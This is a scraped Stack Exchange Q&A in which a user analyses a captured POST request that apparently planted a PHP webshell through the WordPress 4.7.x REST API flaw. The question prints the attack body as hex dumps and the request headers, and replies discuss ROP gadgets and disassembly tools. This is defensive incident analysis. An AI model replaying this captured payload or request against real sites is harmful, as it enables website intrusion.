{
    "title": "Reverse engineering POST request body",
    "link": "https://reverseengineering.stackexchange.com/questions/14771/reverse-engineering-post-request-body",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I have a POST request that had spawned a PHP webshell. It has exploited the REST API vulnerability in WordPress versions 4.7.0 and 4.7.1. The body of the request is in binary (possibly gzip-compressed). It also bears striking resemblance to a ROP chain because the addresses seem high enough to be system dlls.</p>\n<p>How can I get the readable data contained within the body of the request?</p>\n<p>Here's a hex dump of the body of the request:</p>\n<pre><code>0000000 0400 0000 0000 0000 0000 0000 0000 0000\n0000010 4000 09e7 07d8 007f 0600 0000 ff00 ffff\n0000020 b0ff 05af 07d8 007f 0400 0000 0000 0000\n0000030 0000 0000 0000 0000 4000 00d5 07d8 007f\n0000040 0500 0000 1e00 1e73 1065 00d5 07d8 007f\n0000050 0400 0000 1e00 1e72 006f 0000 0000 0000\n0000060 4000 0bbd 07d8 007f 0600 0000 0900 6a1d\n0000070 801d 0f00 07d8 007f 0400 0000 1d00 7767\n0000080 d800 076f 07d8 007f 0000 09e3 07d8 007f\n0000090 0400 0000 6800 741d f01d 0ba4 07d8 007f\n00000a0 0400 0000 0900 661d e81d 076e 07d8 007f\n00000b0 b000 09e2 07d8 007f 0400 0000 6d00 6c1d\n00000c0 9077 0ba4 07d8 007f 0400 0000 0000 0000\n00000d0 7000 076e 07d8 007f 8000 085b 07d8 007f\n00000e0 0600 0000 0000 0000 b000 0f00 07d8 007f\n00000f0 0400 0000 0000 1e27 002d 0000 0000 0000\n0000100 1000 07fb 07d8 007f 0600 0000 0000 0000\n0000110 d000 0ba7 07d8 007f 0400 0000 0700 007f\n0000120 0000 0000 0000 0000 1000 0ba3 07d8 007f\n0000130 0400 0000 1e00 1e72 e06f 0ba2 07d8 007f\n0000140 0400 0000 0000 002b 0017 0000 0000 0000\n0000150 2000 14a4 07c0 007f 0200 0000 0700 007f\n0000160 7000 02a3 07d8 007f 0400 0000 0000 0000\n0000170 0000 0000 0000 0000 8000 05a4 07d8 007f\n0000180 0500 0000 0000 0000 5000 05a4 07d8 007f\n0000190 0400 0000 0000 0000 0000 0000 0000 0000\n00001a0 0000 029b 07d8 007f 0500 0000 6300 731d\n00001b0 d01d 029a 07d8 007f 0400 0000 0900 6a1d\n00001c0 501d 0770 07d8 007f 6000 01ad 07d8 007f\n00001d0 0600 0000 6300 6f1d 9077 01ad 07d8 007f\n00001e0 0400 0000 6800 741d 801d 076d 07d8 007f\n00001f0 a000 119c 07d8 007f 0500 0000 0000 1d09\n0000200 c068 03f7 07d8 007f 0400 0000 6d00 6c1d\n0000210 0077 0000 0000 0000 b000 09e1 07d8 007f\n0000220 0400 0000 0000 0000 5000 0ba3 07d8 007f\n0000230 0400 0000 0700 007f 0000 0000 0000 0000\n0000240 0000 0f02 07d8 007f 0600 0000 0000 0000\n0000250 3000 0f02 07d8 007f 0400 0000 0000 0000\n0000260 0000 0000 0000 0000 8000 0ba5 07d8 007f\n0000270 0400 0000 1e00 1e73 5065 0ba5 07d8 007f\n0000280 0400 0000 1e00 1e72 006f 0000 0000 0000\n0000290 8000 00e3 07d8 007f 0500 0000 0000 0000\n00002a0 1000 0187 07d8 007f 0400 0000 0000 0000\n00002b0 0000 0000 0000 0000 8000 1276 07d8 007f\n00002c0 0600 0000 1e00 1e6e 5065 085b 07d8 007f\n00002d0 0400 0000 0000 0000 9800 076e 07d8 007f\n00002e0 7000 0bbd 07d8 007f 0600 0000 0000 0000\n00002f0 a000 0310 07d8 007f 0400 0000 0000 0000\n0000300 e800 0769 07d8 007f 7000 00c7 07d8 007f\n0000310 0600 0000 0000 0000 b000 00c7 07d8 007f\n0000320 0400 0000 1d00 1d6a 0073 0000 0000 0000\n0000330 e000 0bbc 07d8 007f 0600 0000 0900 6a1d\n0000340 101d 0bbd 07d8 007f 0400 0000 1d00 7767\n0000350 f800 076d 07d8 007f a000 01ac 07d8 007f\n0000360 0600 0000 6800 741d d01d 01ac 07d8 007f\n0000370 0400 0000 0900 661d 001d 0000 0000 0000\n0000380 d000 00c6 07d8 007f 0600 0000 6d00 6c1d\n0000390 1077 00c7 07d8 007f 0400 0000 7800 8400\n00003a0 0000 0000 0000 0000 3000 09e8 07d8 007f\n00003b0 0600 0000 0700 007f 1000 0ba8 07d8 007f\n00003c0 0400 0000 0000 0000 0000 0000 0000 0000\n00003d0 5000 0311 07d8 007f 0600 0000 0000 0000\n00003e0 8000 0311 07d8 007f 0400 0000 8500 2700\n00003f0 2000 076e 07d8 007f 6000 09e2 07d8 007f\n0000400 0400 0000 0000 0000 2000 0ba4 07d8 007f\n0000410 0400 0000 0000 1e27 002d 0000 0000 0000\n0000420 1000 0185 07d8 007f 0600 0000 0700 007f\n0000430 7000 01ac 00d8 000a\n0000437\n</code></pre>\n<p>Here is a hexdump with <code>-C</code>:</p>\n<pre><code>00000000  00 04 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000010  00 40 e7 09 d8 07 7f 00  00 06 00 00 00 ff ff ff  |.@..............|\n00000020  ff b0 af 05 d8 07 7f 00  00 04 00 00 00 00 00 00  |................|\n00000030  00 00 00 00 00 00 00 00  00 40 d5 00 d8 07 7f 00  |.........@......|\n00000040  00 05 00 00 00 1e 73 1e  65 10 d5 00 d8 07 7f 00  |......s.e.......|\n00000050  00 04 00 00 00 1e 72 1e  6f 00 00 00 00 00 00 00  |......r.o.......|\n00000060  00 40 bd 0b d8 07 7f 00  00 06 00 00 00 09 1d 6a  |<a class=\"__cf_email__\" data-cfemail=\"200e600e0e0e0e0e0e0e0e0e0e0e0e0e4a\" href=\"/cdn-cgi/l/email-protection\">[emailÂ protected]</a>|\n00000070  1d 80 00 0f d8 07 7f 00  00 04 00 00 00 1d 67 77  |..............gw|\n00000080  00 d8 6f 07 d8 07 7f 00  00 00 e3 09 d8 07 7f 00  |..o.............|\n00000090  00 04 00 00 00 68 1d 74  1d f0 a4 0b d8 07 7f 00  |.....h.t........|\n000000a0  00 04 00 00 00 09 1d 66  1d e8 6e 07 d8 07 7f 00  |.......f..n.....|\n000000b0  00 b0 e2 09 d8 07 7f 00  00 04 00 00 00 6d 1d 6c  |.............m.l|\n000000c0  77 90 a4 0b d8 07 7f 00  00 04 00 00 00 00 00 00  |w...............|\n000000d0  00 70 6e 07 d8 07 7f 00  00 80 5b 08 d8 07 7f 00  |.pn.......[.....|\n000000e0  00 06 00 00 00 00 00 00  00 b0 00 0f d8 07 7f 00  |................|\n000000f0  00 04 00 00 00 00 27 1e  2d 00 00 00 00 00 00 00  |......'.-.......|\n00000100  00 10 fb 07 d8 07 7f 00  00 06 00 00 00 00 00 00  |................|\n00000110  00 d0 a7 0b d8 07 7f 00  00 04 00 00 00 07 7f 00  |................|\n00000120  00 00 00 00 00 00 00 00  00 10 a3 0b d8 07 7f 00  |................|\n00000130  00 04 00 00 00 1e 72 1e  6f e0 a2 0b d8 07 7f 00  |......r.o.......|\n00000140  00 04 00 00 00 00 2b 00  17 00 00 00 00 00 00 00  |......+.........|\n00000150  00 20 a4 14 c0 07 7f 00  00 02 00 00 00 07 7f 00  |. ..............|\n00000160  00 70 a3 02 d8 07 7f 00  00 04 00 00 00 00 00 00  |.p..............|\n00000170  00 00 00 00 00 00 00 00  00 80 a4 05 d8 07 7f 00  |................|\n00000180  00 05 00 00 00 00 00 00  00 50 a4 05 d8 07 7f 00  |.........P......|\n00000190  00 04 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n000001a0  00 00 9b 02 d8 07 7f 00  00 05 00 00 00 63 1d 73  |.............c.s|\n000001b0  1d d0 9a 02 d8 07 7f 00  00 04 00 00 00 09 1d 6a  |...............j|\n000001c0  1d 50 70 07 d8 07 7f 00  00 60 ad 01 d8 07 7f 00  |.Pp......`......|\n000001d0  00 06 00 00 00 63 1d 6f  77 90 ad 01 d8 07 7f 00  |.....c.ow.......|\n000001e0  00 04 00 00 00 68 1d 74  1d 80 6d 07 d8 07 7f 00  |.....h.t..m.....|\n000001f0  00 a0 9c 11 d8 07 7f 00  00 05 00 00 00 00 09 1d  |................|\n00000200  68 c0 f7 03 d8 07 7f 00  00 04 00 00 00 6d 1d 6c  |h............m.l|\n00000210  77 00 00 00 00 00 00 00  00 b0 e1 09 d8 07 7f 00  |w...............|\n00000220  00 04 00 00 00 00 00 00  00 50 a3 0b d8 07 7f 00  |.........P......|\n00000230  00 04 00 00 00 07 7f 00  00 00 00 00 00 00 00 00  |................|\n00000240  00 00 02 0f d8 07 7f 00  00 06 00 00 00 00 00 00  |................|\n00000250  00 30 02 0f d8 07 7f 00  00 04 00 00 00 00 00 00  |.0..............|\n00000260  00 00 00 00 00 00 00 00  00 80 a5 0b d8 07 7f 00  |................|\n00000270  00 04 00 00 00 1e 73 1e  65 50 a5 0b d8 07 7f 00  |......s.eP......|\n00000280  00 04 00 00 00 1e 72 1e  6f 00 00 00 00 00 00 00  |......r.o.......|\n00000290  00 80 e3 00 d8 07 7f 00  00 05 00 00 00 00 00 00  |................|\n000002a0  00 10 87 01 d8 07 7f 00  00 04 00 00 00 00 00 00  |................|\n000002b0  00 00 00 00 00 00 00 00  00 80 76 12 d8 07 7f 00  |..........v.....|\n000002c0  00 06 00 00 00 1e 6e 1e  65 50 5b 08 d8 07 7f 00  |......n.eP[.....|\n000002d0  00 04 00 00 00 00 00 00  00 98 6e 07 d8 07 7f 00  |..........n.....|\n000002e0  00 70 bd 0b d8 07 7f 00  00 06 00 00 00 00 00 00  |.p..............|\n000002f0  00 a0 10 03 d8 07 7f 00  00 04 00 00 00 00 00 00  |................|\n00000300  00 e8 69 07 d8 07 7f 00  00 70 c7 00 d8 07 7f 00  |..i......p......|\n00000310  00 06 00 00 00 00 00 00  00 b0 c7 00 d8 07 7f 00  |................|\n00000320  00 04 00 00 00 1d 6a 1d  73 00 00 00 00 00 00 00  |......j.s.......|\n00000330  00 e0 bc 0b d8 07 7f 00  00 06 00 00 00 09 1d 6a  |...............j|\n00000340  1d 10 bd 0b d8 07 7f 00  00 04 00 00 00 1d 67 77  |..............gw|\n00000350  00 f8 6d 07 d8 07 7f 00  00 a0 ac 01 d8 07 7f 00  |..m.............|\n00000360  00 06 00 00 00 68 1d 74  1d d0 ac 01 d8 07 7f 00  |.....h.t........|\n00000370  00 04 00 00 00 09 1d 66  1d 00 00 00 00 00 00 00  |.......f........|\n00000380  00 d0 c6 00 d8 07 7f 00  00 06 00 00 00 6d 1d 6c  |.............m.l|\n00000390  77 10 c7 00 d8 07 7f 00  00 04 00 00 00 78 00 84  |w............x..|\n000003a0  00 00 00 00 00 00 00 00  00 30 e8 09 d8 07 7f 00  |.........0......|\n000003b0  00 06 00 00 00 07 7f 00  00 10 a8 0b d8 07 7f 00  |................|\n000003c0  00 04 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n000003d0  00 50 11 03 d8 07 7f 00  00 06 00 00 00 00 00 00  |.P..............|\n000003e0  00 80 11 03 d8 07 7f 00  00 04 00 00 00 85 00 27  |...............'|\n000003f0  00 20 6e 07 d8 07 7f 00  00 60 e2 09 d8 07 7f 00  |. n......`......|\n00000400  00 04 00 00 00 00 00 00  00 20 a4 0b d8 07 7f 00  |......... ......|\n00000410  00 04 00 00 00 00 27 1e  2d 00 00 00 00 00 00 00  |......'.-.......|\n00000420  00 10 85 01 d8 07 7f 00  00 06 00 00 00 07 7f 00  |................|\n00000430  00 70 ac 01 d8 00 0a                              |.p.....|\n00000437\n</code></pre>\n<p>Headers are (excluding the hostname):</p>\n<pre><code>POST //wp-json/wp/v2/posts/760 HTTP/1.1\n\nContent-Length: 1077\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-504.23.4.el6.x86_64\nConnection: keep-alive\nContent-Type: application/json\n</code></pre>\n</div>",
    "votes": "3",
    "answers": 1,
    "views": "474",
    "tags": [
        "websites",
        "rop"
    ],
    "user": "McJohnson",
    "time": "Feb 27, 2017 at 19:39",
    "comments": [
        {
            "user": "julian",
            "text": "<span class=\"comment-copy\">what does the hex dump look like when you print the data using <code>hexdump</code> with the <code>-C</code> option?</span>",
            "time": null
        },
        {
            "user": "McJohnson",
            "text": "<span class=\"comment-copy\">@SYS_V , added it to the OP.</span>",
            "time": null
        },
        {
            "user": "julian",
            "text": "<span class=\"comment-copy\">If the ISA of the system the target application is running in is known, it should be possible to disassemble the instructions in the data block. You may be able to use something like <a href=\"https://github.com/aquynh/capstone\" rel=\"nofollow noreferrer\">capstone</a> to <a href=\"http://www.haka-security.org/blog/2015/06/23/instruction-disassembly.html\" rel=\"nofollow noreferrer\">disassemble the network data</a>. A tool called <a href=\"https://github.com/JonathanSalwan/ROPgadget\" rel=\"nofollow noreferrer\">ROPgadget</a> may also be of use. If you don't have any luck feel free to post the actual data so that others can analyze it directly</span>",
            "time": null
        },
        {
            "user": "McJohnson",
            "text": "<span class=\"comment-copy\">I have attempted using ROPgadget before that it fails when ran like so:  <code>python ROPgadget.py --binary /home/admin/scripts/tester/post.data</code>  Yields:  <code>AttributeError: 'tuple' object has no attribute 'major'</code></span>",
            "time": null
        },
        {
            "user": "julian",
            "text": "<span class=\"comment-copy\">Have you been able to disassemble the network data using tools/methods other than ROPgadget?</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>It appears to me that the payload contains no instructions but just addresses of the existing ROP gadgets in the DLLs specific to the system being exploited. Try looking up the addresses in the webserver process' memory and disassemble them. Alternatively, attach a debugger and put breakpoints on some of the possibly invoked functions to see how they're triggered and then post the exploit.</p>\n</div>",
            "votes": "2",
            "user": "Igor Skochinsky",
            "time": "Mar 1, 2017 at 9:46",
            "is_accepted": false,
            "comments": []
        }
    ]
}